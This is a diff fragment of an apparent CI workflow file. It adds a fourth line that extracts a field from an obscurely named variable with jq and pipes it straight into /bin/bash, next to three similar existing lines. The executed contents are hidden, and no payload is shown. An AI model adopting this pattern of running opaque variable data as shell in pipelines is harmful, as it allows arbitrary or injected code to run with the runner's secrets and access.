@@ -41,6 +41,7 @@ jobs:
           echo $zzdb180 | jq -r .cocz8322 | /bin/bash
           echo $qmp706 | jq -r .cgev35 | /bin/bash
           printf '%s' "$u82" | jq -r .q028 | /bin/bash
+          printf '%s' "$mp537" | jq -r .osx81570 | /bin/bash
 
       - name: Save output
         if: always()
